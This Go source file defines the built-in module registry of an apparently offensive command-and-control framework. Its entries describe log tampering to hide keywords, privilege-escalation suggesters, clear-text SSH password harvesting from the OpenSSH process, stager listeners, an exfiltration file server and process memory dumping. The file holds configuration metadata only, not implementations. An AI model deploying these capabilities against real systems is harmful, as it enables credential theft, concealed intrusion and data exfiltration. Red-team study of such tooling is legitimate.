package def

import "sync"

// built-in module names
const (
	ModCLEAN_LOG   = "clean_log"
	ModLPE_SUGGEST = "lpe_suggest"

	ModPORT_FWD     = "port_fwd"
	ModSHELL        = "interactive_shell"
	ModBring2CC     = "bring2cc"
	ModListener     = "listener"
	ModSSHHarvester = "ssh_harvester"
	ModFileServer   = "file_server"
	ModDownloader   = "file_downloader"
	ModMemDump      = "mem_dump"
)

// ModOption represents module options with typing metadata
type ModOption struct {
	Name     string   `cbor:"1,keyasint"`  // option name
	Desc     string   `cbor:"2,keyasint"`  // option description
	Val      string   `cbor:"3,keyasint"`  // option value (current / default)
	Vals     []string `cbor:"4,keyasint"`  // allowed values for enum-like options
	Type     string   `cbor:"5,keyasint"`  // string,int,uint,bool,enum,base64,duration,port
	Required bool     `cbor:"6,keyasint"`  // whether the option is required
	Pattern  string   `cbor:"7,keyasint"`  // optional regex validation for strings
	Encoding string   `cbor:"8,keyasint"`  // encoding hint (utf8/utf16le) for string/binary
	Secret   bool     `cbor:"9,keyasint"`  // mark sensitive values (avoid logging)
	Min      *float64 `cbor:"10,keyasint"` // numeric lower bound
	Max      *float64 `cbor:"11,keyasint"` // numeric upper bound
}

// ModOptions represents multiple module options
type ModOptions map[string]*ModOption

// InvocationArg models a single argv element
type InvocationArg struct {
	Literal string // raw value
	Flag    string // flag prefix, eg. -I
	Param   string // reference to option name
}

// CoffArgSpec defines a COFF argument and its wire type
type CoffArgSpec struct {
	Param    string
	Literal  any
	WireType string
	Encoding string
}

// CoffInvocation defines how to invoke a COFF/BOF export
type CoffInvocation struct {
	Export string
	Args   []CoffArgSpec
}

// InvocationSpec defines how to run a module
type InvocationSpec struct {
	Argv           []InvocationArg
	StdinParam     string
	TimeoutSeconds int
	Coff           *CoffInvocation
}

// ResolvedInvocation is the rendered form sent to the agent
type ResolvedInvocation struct {
	Argv           []string                `cbor:"1,keyasint"`
	Stdin          string                  `cbor:"2,keyasint"`
	TimeoutSeconds int                     `cbor:"3,keyasint"`
	Coff           *ResolvedCoffInvocation `cbor:"4,keyasint"`
}

// ResolvedCoffInvocation contains packed COFF args with concrete values
type ResolvedCoffInvocation struct {
	Export string            `cbor:"1,keyasint"`
	Args   []ResolvedCoffArg `cbor:"2,keyasint"`
}

// ResolvedCoffArg holds a typed value to be packed by lighthouse
type ResolvedCoffArg struct {
	WireType string `cbor:"1,keyasint"`
	Value    any    `cbor:"2,keyasint"`
	Encoding string `cbor:"3,keyasint"`
}

// AgentModuleConfig stores configuration data for the agent side
type AgentModuleConfig struct {
	Exec          string   `cbor:"1,keyasint"` // Run this executable file on agent
	Files         []string `cbor:"2,keyasint"` // Files to be uploaded to agent
	InMemory      bool     `cbor:"3,keyasint"` // run this module in memory
	Type          string   `cbor:"4,keyasint"` // "go", "python", "powershell", "bash", "exe", "elf", "dll", "so", "coff"
	IsInteractive bool     `cbor:"5,keyasint"` // whether run as a shell or not, eg. python, bettercap
	WorkDir       string   `cbor:"6,keyasint"` // optional working directory
	NeedsRoot     bool     `cbor:"7,keyasint"` // hint for privilege requirements
}

// ModuleConfig stores the complete module config data
type ModuleConfig struct {
	Name        string            `cbor:"1,keyasint"`  // Display as this name
	Build       string            `cbor:"2,keyasint"`  // Command to run on C2, you can use it to build module
	Author      string            `cbor:"3,keyasint"`  // by whom
	Date        string            `cbor:"4,keyasint"`  // when did you write it
	Comment     string            `cbor:"5,keyasint"`  // describe your module in one line
	IsLocal     bool              `cbor:"6,keyasint"`  // If true, this module is a C2 plugin and doesn't run on agent, use `Build` to specify the command to run
	Platform    string            `cbor:"7,keyasint"`  // targeting which OS? Linux/Windows
	Path        string            `cbor:"8,keyasint"`  // Path to the module directory
	Fileless    bool              `cbor:"9,keyasint"`  // If true, this module doesn't drop files to disk
	Options     ModOptions        `cbor:"10,keyasint"` // module options, will be passed as environment variables to the module, either on C2 or agent side
	AgentConfig AgentModuleConfig `cbor:"11,keyasint"` // Configuration for agent side
	Invocation  InvocationSpec    `cbor:"12,keyasint"` // how to run the module without run.sh/env
}

// Module help info and options
var Modules sync.Map // map[string]*ModuleConfig

func init() {
	populateModules()
}

func populateModules() {
	builtIn := map[string]*ModuleConfig{
		ModCLEAN_LOG: {
			Name:     ModCLEAN_LOG,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Delete lines containing keyword from xtmp logs",
			IsLocal:  false,
			Platform: "Linux",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"keyword": &ModOption{
					Name: "keyword",
					Desc: "Delete all log entries containing this keyword",
					Vals: []string{"root", "admin"},
					Val:  "root",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModLPE_SUGGEST: {
			Name:     ModLPE_SUGGEST,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Run linux-smart-enumeration or linux exploit suggester",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: false,
			Options: ModOptions{
				"lpe_helper": &ModOption{
					Name: "lpe_helper",
					Desc: "Which LPE helper to use, available helpers: lpe_les (Linux exploit suggester), lpe_lse (Linux smart enumeration), lpe_linpeas (PEASS-ng, works on Linux), lpe_winpeas (PEASS-ng, works on Windows",
					Vals: []string{"lpe_les", "lpe_lse", "lpe_linpeas", "lpe_winpeas"},
					Val:  "lpe_les",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},

		ModBring2CC: {
			Name:     ModBring2CC,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Bring arbitrary agent to CC",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"addr": &ModOption{
					Name: "addr",
					Desc: "Target host to proxy, we will connect to it and proxy it out",
					Vals: []string{"127.0.0.1"},
					Val:  "",
				},
				"kcp": &ModOption{
					Name: "kcp",
					Desc: "Use KCP (fast UDP tunnel) for proxy",
					Vals: []string{"on", "off"},
					Val:  "on",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModListener: {
			Name:     ModListener,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Start a listener to serve stagers or regular files",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"payload": &ModOption{
					Name: "payload",
					Desc: "The payload to serve, eg. ./stager",
				},
				"listener": &ModOption{
					Name: "listener",
					Desc: "Listener type: http_aes_compressed, tcp_aes_compressed, udp_aes_compressed",
					Val:  "http_aes_compressed",
					Vals: []string{"http_aes_compressed", "tcp_aes_compressed", "udp_aes_compressed"},
				},
				"port": &ModOption{
					Name: "port",
					Desc: "Port to listen on, eg. 8080",
				},
				"compression": &ModOption{
					Name: "compression",
					Desc: "Compression algorithm, eg. on, off",
					Val:  "on",
					Vals: []string{"on", "off"},
				},
				"passphrase": &ModOption{
					Name: "passphrase",
					Desc: "Passphrase for encryption",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModSSHHarvester: {
			Name:     ModSSHHarvester,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Harvest clear-text password automatically from OpenSSH server process",
			IsLocal:  false,
			Platform: "Linux",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"code_pattern": &ModOption{
					Name: "code_pattern",
					Desc: "Code pattern to set breakpoint, big-endian. agent will stop there and dump password, and check RAX to make sure password is valid",
					Val:  "4883c4080fb6c021",
				},
				"reg_name": &ModOption{
					Name: "reg_name",
					Desc: "Register name that stores password, eg. RDI",
					Val:  "RSI",
					Vals: []string{"RDI", "RSI", "RDX", "RCX", "R8", "R9", "RAX", "RBX", "RBP", "RSP", "RIP"},
				},
				"stop": &ModOption{
					Name: "stop",
					Desc: "Stop the harvester: no, yes",
					Val:  "no",
					Vals: []string{"no", "yes"},
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModFileServer: {
			Name:     ModFileServer,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Start a secure file server on target host for data exfiltration and module file caching",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: true,
			Options: ModOptions{
				"port": &ModOption{
					Name: "port",
					Desc: "Port to listen on",
					Val:  "8000",
				},
				"switch": &ModOption{
					Name: "switch",
					Desc: "Turn file server on/off",
					Val:  "on",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModDownloader: {
			Name:     ModDownloader,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Download and decrypt a file from other agents, run `file_server` first",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: false,
			Options: ModOptions{
				"download_addr": &ModOption{
					Name: "download_addr",
					Desc: "Download address, eg 10.1.1.1:8000",
					Val:  "",
				},
				"path": &ModOption{
					Name: "path",
					Desc: "Path to the file (on server) to download, eg. /tmp/agent.exe",
					Val:  "",
				},
				"checksum": &ModOption{
					Name: "checksum",
					Desc: "SHA256 checksum of the file, used to verify integrity, wont't check if empty",
					Val:  "",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
		ModMemDump: {
			Name:     ModMemDump,
			Build:    "",
			Date:     "2020-01-25",
			Comment:  "Dump memory regions of a process",
			IsLocal:  false,
			Platform: "Generic",
			Path:     "",
			Fileless: false,
			Options: ModOptions{
				"pid": &ModOption{
					Name: "pid",
					Desc: "PID of the target process",
					Val:  "",
				},
			},
			AgentConfig: AgentModuleConfig{
				Exec:          "built-in",
				Files:         []string{},
				InMemory:      false,
				Type:          "go",
				IsInteractive: false,
			},
		},
	}

	for k, v := range builtIn {
		Modules.Store(k, v)
	}
}
